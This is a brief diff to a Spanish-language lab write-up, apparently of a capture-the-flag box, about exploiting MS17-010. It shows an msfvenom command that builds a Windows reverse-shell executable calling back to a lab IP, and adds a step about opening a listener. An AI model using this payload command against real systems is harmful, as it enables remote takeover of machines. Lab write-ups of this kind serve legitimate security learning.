@@ -187,3 +187,7 @@ Usaremos [send-and-execute](https://github.com/helviojunior/MS17-010/blob/master
 Necesitaremos crear una shellcode como hiciamos anteriormente.
 
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe```
+
+Abrimos un puerto en escucha
+
+![portm17.jpg]({{site.baseurl}}/images/Legacy/portm17.jpg) 
